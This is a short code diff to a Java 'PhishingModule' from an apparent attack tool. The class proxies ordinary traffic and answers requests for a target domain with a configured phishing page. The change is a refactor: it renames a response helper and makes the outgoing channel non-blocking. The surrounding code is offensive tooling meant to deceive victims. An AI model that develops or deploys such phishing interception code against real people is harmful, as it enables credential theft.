@@ -5,7 +5,7 @@ import gl4di4tor.log.LogService;
 import gl4di4tor.module.BaseModule;
 import gl4di4tor.net.OutgoingChannel;
 import gl4di4tor.net.http.HttpRequest;
-import gl4di4tor.net.http.HttpResponse;
+import gl4di4tor.net.http.HttpResponseMaker;
 
 import java.io.DataOutputStream;
 import java.net.Socket;
@@ -41,14 +41,15 @@ public class PhishingModule extends BaseModule {
         }
 
         if (httpRequest != null && !isTargetDomain(httpRequest)) {
-            new OutgoingChannel(httpRequest.getHeaderParam("Host"), this.socket, socketData, dataLen);
+            new OutgoingChannel(httpRequest.getHeaderParam("Host"), this.socket, socketData, dataLen,
+                    OutgoingChannel.ChannelMode.NON_BLOCKING).execute();
             return;
         }
 
         try {
             DataOutputStream out = new DataOutputStream(this.socket.getOutputStream());
 
-            out.writeUTF(HttpResponse.makeHttpResponse(Config.getInstance().getPhishingPage()));
+            out.writeUTF(HttpResponseMaker.makeHttpResponse(Config.getInstance().getPhishingPage()));
             out.flush();
             this.socket.close();
         } catch (NoSuchFileException e) {
